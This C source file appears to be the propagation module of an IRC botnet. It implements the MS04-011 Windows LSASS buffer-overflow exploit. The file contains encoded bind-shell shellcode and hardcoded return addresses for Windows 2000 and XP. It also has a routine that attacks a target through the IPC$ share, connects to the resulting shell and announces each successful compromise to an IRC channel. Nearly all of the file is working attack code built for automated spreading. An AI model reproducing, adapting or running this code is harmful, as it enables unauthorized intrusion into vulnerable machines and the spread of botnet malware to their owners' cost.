// Comments from K-OTik.COM : to make this exploit work remotely you have to use the
// sbaaNetapi.dll wich modifies the DsRoleUpgradeDownlevelServer API, this will allow
// the remote host to be specified as explained on eeye advisory...
//
// http://www.k-otik.com/exploits/04252004.ms04011lsass.rar


/*#include <windows.h>
#pragma comment(lib,"mpr.lib")
#pragma comment(lib, "ws2_32")*/

#include "includes.h"
#include "functions.h"
#include "externs.h"


unsigned char bsh[] =
"\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x7D\x01\x80\x34\x0A\x99\xE2\xFA"
"\xEB\x05\xE8\xEB\xFF\xFF\xFF"

"\x70\x95\x98\x99\x99\xC3\xFD\x38\xA9\x99\x99\x99\x12\xD9\x95\x12"
"\xE9\x85\x34\x12\xD9\x91\x12\x41\x12\xEA\xA5\x12\xED\x87\xE1\x9A"
"\x6A\x12\xE7\xB9\x9A\x62\x12\xD7\x8D\xAA\x74\xCF\xCE\xC8\x12\xA6"
"\x9A\x62\x12\x6B\xF3\x97\xC0\x6A\x3F\xED\x91\xC0\xC6\x1A\x5E\x9D"
"\xDC\x7B\x70\xC0\xC6\xC7\x12\x54\x12\xDF\xBD\x9A\x5A\x48\x78\x9A"
"\x58\xAA\x50\xFF\x12\x91\x12\xDF\x85\x9A\x5A\x58\x78\x9B\x9A\x58"
"\x12\x99\x9A\x5A\x12\x63\x12\x6E\x1A\x5F\x97\x12\x49\xF3\x9A\xC0"
"\x71\x1E\x99\x99\x99\x1A\x5F\x94\xCB\xCF\x66\xCE\x65\xC3\x12\x41"
"\xF3\x9C\xC0\x71\xED\x99\x99\x99\xC9\xC9\xC9\xC9\xF3\x98\xF3\x9B"
"\x66\xCE\x75\x12\x41\x5E\x9E\x9B\x99\x9D\x4B\xAA\x59\x10\xDE\x9D"
"\xF3\x89\xCE\xCA\x66\xCE\x69\xF3\x98\xCA\x66\xCE\x6D\xC9\xC9\xCA"
"\x66\xCE\x61\x12\x49\x1A\x75\xDD\x12\x6D\xAA\x59\xF3\x89\xC0\x10"
"\x9D\x17\x7B\x62\x10\xCF\xA1\x10\xCF\xA5\x10\xCF\xD9\xFF\x5E\xDF"
"\xB5\x98\x98\x14\xDE\x89\xC9\xCF\xAA\x50\xC8\xC8\xC8\xF3\x98\xC8"
"\xC8\x5E\xDE\xA5\xFA\xF4\xFD\x99\x14\xDE\xA5\xC9\xC8\x66\xCE\x79"
"\xCB\x66\xCE\x65\xCA\x66\xCE\x65\xC9\x66\xCE\x7D\xAA\x59\x35\x1C"
"\x59\xEC\x60\xC8\xCB\xCF\xCA\x66\x4B\xC3\xC0\x32\x7B\x77\xAA\x59"
"\x5A\x71\x76\x67\x66\x66\xDE\xFC\xED\xC9\xEB\xF6\xFA\xD8\xFD\xFD"
"\xEB\xFC\xEA\xEA\x99\xDA\xEB\xFC\xF8\xED\xFC\xC9\xEB\xF6\xFA\xFC"
"\xEA\xEA\xD8\x99\xDC\xE1\xF0\xED\xCD\xF1\xEB\xFC\xF8\xFD\x99\xD5"
"\xF6\xF8\xFD\xD5\xF0\xFB\xEB\xF8\xEB\xE0\xD8\x99\xEE\xEA\xAB\xC6"
"\xAA\xAB\x99\xCE\xCA\xD8\xCA\xF6\xFA\xF2\xFC\xED\xD8\x99\xFB\xF0"
"\xF7\xFD\x99\xF5\xF0\xEA\xED\xFC\xF7\x99\xF8\xFA\xFA\xFC\xE9\xED"
"\x99\xFA\xF5\xF6\xEA\xFC\xEA\xF6\xFA\xF2\xFC\xED\x99";



/*typedef int (_stdcall *DSROLEUPGRADEDOWNLEVELSERVER)
(unsigned long, unsigned long, unsigned long, unsigned long,
 unsigned long, unsigned long, unsigned long, unsigned long,
 unsigned long, unsigned long, unsigned long, unsigned long);*/
typedef int (_stdcall *DSROLEUPGRADEDOWNLEVELSERVER)
(char*, char*, char*, char*, char*, char*,
 char*, char*, char*, char*, char*, char*);
DSROLEUPGRADEDOWNLEVELSERVER DsRoleUpgradeDownlevelServer;

#define LEN 3500


BOOL CallDS2(EXINFO exinfo)
{
	int ret=0;
	int i;
	char *target = exinfo.ip, buffer[IRCLINE];
	LPSTR hostipc[40];
	NETRESOURCE netResource;
	BOOL bRet=FALSE;
	unsigned short port;
	char buf[LEN+1];
	char sendbuf[(LEN+1)*2];
	char buf2[2];
	char target2[200];
	
	/*if (argc < 3) {
	printf("Windows Lsasrv.dll RPC [ms04011] buffer overflow Remote Exploit\n \bug discoveried by eEye,\n \
	code by sbaa (sysop sbaa 3322 org) 2004/04/24 ver 0.1\n \
	Usage: \n \
	%s 0 targetip (Port ConnectBackIP ) \
	----> attack 2k (tested on cn sp4,en sp4)\n \
	%s 1 targetip (Port ConnectBackIP ) \
	----> attack xp (tested on cn sp1)\n",argv[0],argv[0]);
	printf("");
	return 0;
}*/
	sprintf((char *)hostipc,"\\\\%s\\ipc$",target);
	
	netResource.lpLocalName = NULL;
	netResource.lpProvider = NULL;
	netResource.dwType = RESOURCETYPE_ANY;
	netResource.lpRemoteName=(char *)hostipc;
	if (fWNetAddConnection2(&netResource,"","",0) != NO_ERROR) {
		fWNetCancelConnection2(netResource.lpRemoteName,0,TRUE);
		return FALSE;
	}
	
	
	HMODULE hNetapi = LoadLibrary("netapi32.dll");
	if (!hNetapi) {
		fWNetCancelConnection2(netResource.lpRemoteName,0,TRUE);
		return FALSE;
	}

	//FARPROC DsRoleUpgradeDownlevelServer = (HANDLE)GetProcAddress(hNetapi,"DsRoleUpgradeDownlevelServer");
	(DSROLEUPGRADEDOWNLEVELSERVER)DsRoleUpgradeDownlevelServer = (DSROLEUPGRADEDOWNLEVELSERVER)GetProcAddress(hNetapi, "DsRoleUpgradeDownlevelServer");
	
	if (!DsRoleUpgradeDownlevelServer) {
		fWNetCancelConnection2(netResource.lpRemoteName,0,TRUE);
		FreeLibrary(hNetapi);
		return FALSE;
	}

	int tType=0, targetOS = FpHost(exinfo.ip, FP_PORT5K);
	if (targetOS == OS_WINXP || (rand() % 5)) tType = 1;
	else tType = 0;
	
	memset(buf, '\x90', LEN);
	port = fhtons(1981)^(USHORT)0x9999;
	memcpy(&bsh[176], &port, 2);
	//attack all 2k sp3 version
	
	memcpy(&buf[2020], "\x95\x0c\x01\x78", 4);
	memcpy(&buf[2036], bsh, sizeof(bsh));
	
	//attack all 2k sp4 version
	memcpy(&buf[2840], "\xeb\x06\xeb\x06", 4);
	memcpy(&buf[2844],"\x2b\x38\x03\x78",4);
	
	memcpy(&buf[2856], bsh, sizeof(bsh));
	
	
	//printf("shellcode size %d\n", strlen(sc));
	
	
	for(i=0; i<LEN; i++) { //unicode
		sendbuf[i*2] = buf[i];
		sendbuf[i*2+1] = 0;
	}
	sendbuf[LEN*2]=0;
	sendbuf[LEN*2+1]=0;
	
	if(tType) //xp
	{
		memcpy(&sendbuf, bsh, sizeof(bsh));
		memcpy(sendbuf+1964,"\xad\x14\x48\x74",4);
		memcpy(&sendbuf[1948], "\xb8\x44\xf8\xff\xff\x03\xc4\x81\xec\x00\x20\x00\x00\xff\xe0\x00", 16);
		memcpy(&sendbuf[1980], "\xeb\xde",2);
	}
	memset(target2, 0, 100);
	for(i=0; i<sizeof(target); i++) {
		target2[i*2] = target[i];
		target2[i*2+1] = 0;
	}
	memset(buf2, 0, 2);
	//sprintf(p, "%u%u", &sendbuf[0], &buf2[0]);
	ret=0;
	ret=DsRoleUpgradeDownlevelServer(&sendbuf[0], &buf2[0], &buf2[0], &buf2[0], &buf2[0], &buf2[0], &buf2[0], &buf2[0], target2, &buf2[0], &buf2[0], &buf2[0]);
	
	//printf("Ret value = %d\n",ret);

	if (ConnectShell(exinfo, port) == TRUE) bRet = TRUE;
	
	//fWSACleanup();
	// --------------------  end of core
	
	if (bRet == TRUE) {
		_snprintf(buffer, sizeof(buffer), "[%s]: Exploiting IP: %s.", exploit[exinfo.exploit].name, exinfo.ip);
		if (!exinfo.silent) irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);
		addlog(buffer);
		exploit[exinfo.exploit].stats++;
	}

	fWNetCancelConnection2(netResource.lpRemoteName, 0, TRUE);
	FreeLibrary(hNetapi);
	
	return bRet;
}


